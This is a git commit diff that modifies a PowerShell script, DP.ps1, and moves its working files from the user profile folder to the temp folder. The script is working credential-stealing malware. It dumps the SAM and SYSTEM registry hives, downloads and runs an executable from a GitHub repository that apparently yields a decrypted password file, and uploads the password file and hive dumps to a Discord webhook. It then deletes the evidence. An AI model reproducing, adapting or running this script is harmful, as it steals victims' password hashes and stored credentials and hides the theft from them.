f4b3060aeea6c0efa6a75bd743138e1b78aab3fe
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-02 12:44:03 -0600

    Update DP.ps1

--- DP.ps1
+++ DP.ps1
@@ -1,11 +1,10 @@
 cd ..\..
-cd $env:USERPROFILE
+cd $env:TMP
 reg save HKLM\sam ./sam.save
 reg save HKLM\system ./system.save
 
-iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:USERPROFILE\d.exe
-start-sleep 5
-Start-process "$env:USERPROFILE\d.exe"
+iwr https://github.com/skekic16/lol/raw/main/d.exe?dl=1 -O $Env:TMP\d.exe
+Start-process "$env:TMP\d.exe"
 start-sleep 5
 function Upload-Discord {
 
@@ -29,10 +28,10 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-Upload-Discord -file $env:USERPROFILE\decrypted_password.csv
-Upload-Discord -file $env:USERPROFILE\sam.save
-Upload-Discord -file $env:USERPROFILE\system.save
-rm "$env:USERPROFILE\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
-rm "$env:USERPROFILE\d.exe" -r -Force -ErrorAction SilentlyContinue
-rm "$env:USERPROFILE\sam.save" -r -Force -ErrorAction SilentlyContinue
-rm "$env:USERPROFILE\system.save" -r -Force -ErrorAction SilentlyContinue
+Upload-Discord -file $env:TMP\decrypted_password.csv
+Upload-Discord -file $env:TMP\sam.save
+Upload-Discord -file $env:TMP\system.save
+rm "$env:TMP\decrypted_password.csv" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\d.exe" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\sam.save" -r -Force -ErrorAction SilentlyContinue
+rm "$env:TMP\system.save" -r -Force -ErrorAction SilentlyContinue
